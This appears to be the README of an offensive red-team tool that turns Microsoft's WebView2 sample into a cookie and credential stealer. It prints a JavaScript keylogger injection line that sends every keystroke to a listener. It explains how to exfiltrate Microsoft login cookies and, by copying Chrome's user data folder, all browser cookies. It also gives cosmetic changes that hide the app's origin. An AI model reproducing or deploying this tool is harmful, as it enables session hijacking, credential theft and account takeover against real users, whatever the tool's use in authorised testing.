# Blog Post

Please read <a href="https://mrd0x.com/attacking-with-webview2-applications/" target="_blank">this blog post</a> to get more information.

# Source Code

This code is a modified version of <a href="https://github.com/MicrosoftEdge/WebView2Samples" target="_blank">Microsoft's WebView2 Code</a>. The current code can be cleaned up and made much better.

# Demo

## Launch Example

<img src="https://github.com/mrd0x/WebView2-Cookie-Stealer/blob/main/launch.gif">

## Usage Example

<img src="https://github.com/mrd0x/WebView2-Cookie-Stealer/blob/main/demo2.gif">

# Usage

**Tested on Windows 10 & 11.**

When the binary is executed ```https://office.com/login``` is loaded up. A JavaScript keylogger is injected into every page and keystrokes are sent to ```http://127.0.0.1:8080```. Furthermore, upon the user successfully authenticating the cookies for ```login.microsoftonline.com``` are base64-encoded and sent to ```http://127.0.0.1:8080``` via an HTTP GET request.

# Modifying JavaScript

If you'd like to modify the JavaScript the code that needs to be changed is shown below at ```line 1096``` in ```AppWindow.cpp```.

```
coreWebView2->AddScriptToExecuteOnDocumentCreated(L"var link = \"http://127.0.0.1:8080/keylog?k=\";var l = \"\";document.onkeypress = function (e){l += e.key;var req = new XMLHttpRequest();req.open(\"GET\",link.concat(l), true);req.send();}", nullptr);
```

# Stealing Chrome Cookies

WebView2 allows you to launch with an existing User Data Folder (UDF) rather than creating a new one. The UDF contains all passwords, sessions, bookmarks etc. Chrome's UDF is located at ```C:\Users\<username>\AppData\Local\Google\Chrome\User Data```. We can simply tell WebView2 to start the instance using this profile and upon launch extract all cookies and transfer them to the attacker's server.

The only catch is that WebView2 looks for a folder called ```EBWebView``` instead of ```User Data``` (not sure why). Copy the ```User Data``` folder and rename it to ```EBWebView```.

## Required Changes

* At ```line 41``` in ```app.cpp```:
  * Change ```std::wstring userDataFolder(L"");``` to ```std::wstring userDataFolder(L"C:\\Path\\To\\Temp");```
  * The specified folder must contain the ```EBWebView``` folder which WebView2 will read from.

* At ```line 40``` in ```ScenarioCookieManagement.cpp```:
  * Change ```GetCookiesHelper(L"https://login.microsoftonline.com");``` to ```GetCookiesHelper(L"");```

When GetCookiesHelper is invoked without any website being provided it will extract all cookies.

**Note: This will not work with the current application if there is a large quantity of cookies because the application sends them using a GET Request which has a length limit.**

# Important Functions

If you'd like to make modifications to the binary you'll find information about the important functions below.

* AppStartPage.cpp - ```GetUri()``` function has the URL that is loaded upon binary execution.
* ScenarioCookieManagement.cpp - ```SendCookies()``` function contains the IP address and port where the cookies are sent.
* AppWindow.cpp - ```CallCookieFunction()``` function waits until the URL starts with ```https://www.office.com/?auth=``` and calls ```ScenarioCookieManagement::GetCookiesHelper(L"https://login.microsoftonline.com")```
* WebView2APISample.rc - Cosmetic changes
  * Remove the menu bar by setting all ```POPUP``` values to ```""```.
  * Change ```IDS_APP_TITLE``` and ```IDC_WEBVIEW2APISAMPLE```. This is the name of the application in the title bar.
  * Change ```IDI_WEBVIEW2APISAMPLE``` and ```IDI_WEBVIEW2APISAMPLE_INPRIVATE``` and ```IDI_SMALL```. These point to a ```.ico``` file which is the icon for this application.
* Toolbar.cpp - ```itemHeight``` must be set to 0 to remove the top menu. This is already taken care of in this code.
* AppWindow.cpp - ```LoadImage()``` should be commented out. This hides the blue splash image. This is already taken care of in this code.
* App.cpp - ```new AppWindow(creationModeId, WebViewCreateOption(), initialUri, userDataFolder, false);``` change the last param value to ```true```. This hides the toolbar. This is already taken care of in this code.
